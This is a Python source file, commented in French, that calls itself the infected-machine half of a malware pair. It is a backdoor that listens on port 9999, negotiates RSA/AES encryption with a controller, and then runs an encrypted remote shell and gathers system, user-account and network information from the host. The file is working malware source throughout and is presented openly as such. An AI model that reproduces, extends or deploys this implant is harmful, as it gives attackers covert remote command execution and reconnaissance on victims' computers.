"""Malware: Ce deuxième programme se trouve sur une machine infectée.
Celui-ci recevra des ordres du premier programme et réalisera les actions correspondantes."""

import socket
import os
import subprocess
import platform
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes


class Machine:
    def __init__(self):
        self.buffer = 2048
        self.key_aes = None
        self.iv_aes = None
        # Crée un socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Erreur de création de socket: " + str(msg))

    # Reçoit un message chiffré en AES
    def reliable_recv_encryption_aes(self, connection):
        mode_aes = AES.MODE_CFB
        text_enc = connection.recv(self.buffer)
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Exécute l'algorithme de chiffrement
        text = cipher_aes.decrypt(text_enc)
        try:
            return text.decode("utf-8")
        except UnicodeDecodeError:
            return text

    # Envoie le message en AES
    def reliable_send_encryption_aes(self, connection, text_to_encrypt):
        if type(text_to_encrypt) == str:
            text_to_encrypt = text_to_encrypt.encode("utf-8")
        mode_aes = AES.MODE_CFB
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Exécute l'algorithme de chiffrement
        text_enc = cipher_aes.encrypt(text_to_encrypt)
        connection.send(text_enc)

    # Ferme la connexion
    def quit(self):
        self.s.close()


class Target(Machine):

    # Initialise l'hôte et le port du serveur
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host    # Str
        self.port = port    # Int
        self.conn = None
        self.information = []   # List
        self.key_pub_client = None

    # Bind le socket avec le port
    def socket_bind(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error:
            self.quit()

    # Accepte nouvelle connexion
    def socket_accept(self):
        self.conn, self.information = self.s.accept()

    # Reçoit la clé RSA générée par le client
    def recv_key_rsa(self):
        key_pub_from_client = self.conn.recv(self.buffer)
        self.key_pub_client = RSA.import_key(key_pub_from_client)

    # Génère une clé AES et l'envoie au client
    def send_key_aes(self):
        self.key_aes = get_random_bytes(16)
        #print(self.key_aes)    # Clé AES en plaintext
        self.iv_aes = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(self.key_pub_client)  # Prépare l'algorithme de chiffrement
        key_aes_enc = cipher_rsa.encrypt(self.key_aes)  # Exécute l'algorithme de chiffrement
        cipher_rsa = PKCS1_OAEP.new(self.key_pub_client)
        iv_aes_enc = cipher_rsa.encrypt(self.iv_aes)
        self.conn.send(key_aes_enc)  # Envoie la clé AES et le vecteur chiffrées
        #print(key_aes_enc)
        self.conn.send(iv_aes_enc)

    # Boucle qui attend l'instruction
    def what_to_do(self):
        try:
            instruction = ""
            while instruction != "quitter":
                instruction = super().reliable_recv_encryption_aes(self.conn)
                if instruction == "shell":
                    self.remote_shell_target()
                elif instruction == "getinfo_generality":
                    self.getinfo_target_generality()
                elif instruction == "ipconfig":
                    self.getinfo_target_cmd(instruction)
                elif instruction == "net user":
                    self.getinfo_target_cmd(instruction)
                elif instruction == "netstat -a":
                    self.getinfo_target_cmd(instruction)
        except ConnectionResetError as msg:
            print("Erreur : " + str(msg))
            self.quit()

    def remote_shell_target(self):
        data = super().reliable_recv_encryption_aes(self.conn)
        while data != "quitter":
            try:
                if data[:2] == 'cd':
                    os.chdir(data[3:])  # Renvoie None
                if len(data) > 0:
                    cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors='replace')
                    super().reliable_send_encryption_aes(self.conn, output_str + str(os.getcwd()) + "> ")
            except OSError as msg:
                error_msg = "Erreur OS : " + str(msg)
                super().reliable_send_encryption_aes(self.conn, error_msg)
            data = super().reliable_recv_encryption_aes(self.conn)
        super().reliable_send_encryption_aes(self.conn, "Vous avez quitté l'invite de commande sur la cible\n")

    # Informations sur la cible
    def getinfo_target_generality(self):
        super().reliable_send_encryption_aes(self.conn, "INFORMATION'S TARGET: \n")
        super().reliable_send_encryption_aes(self.conn, "System: " + platform.uname()[0] + "\nUser (node): "
                                            + platform.uname()[1] + "\nRelease: " + platform.uname()[2] + "\nVersion: "
                                            + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                                            + "\nProcessor: " + platform.uname()[5])

    # Sert à renvoyer les informations (ipconfig  user list netstat)
    def getinfo_target_cmd(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='replace')
        super().reliable_send_encryption_aes(self.conn, command)
        super().reliable_send_encryption_aes(self.conn, output_str)


    # Ferme la connexion et le socket
    def quit(self):
        try:
            super().reliable_send_encryption_aes(self.conn, "La connexion se ferme pour \n\tIP: " + self.information[0] + "\n\tPort " + str(self.information[1]))
            self.conn.close()
            super().quit()
        except socket.error as msg:
            print("Le socket ne se ferme pas : " + str(msg))
            self.conn.close()
            super().quit()
            exit(0)
        except ConnectionResetError:
            print("La connexion a déjà été stoppée")
            super().quit()

while True: # Boucle générale du programme
    target = Target()
    target.socket_bind()
    target.socket_accept()
    try:
        target.recv_key_rsa()
        target.send_key_aes()
        target.what_to_do()
    except ConnectionResetError as msg:
        print("La connexion a déjà été stoppée")
        print("Erreur : " + str(msg))
        target.quit()
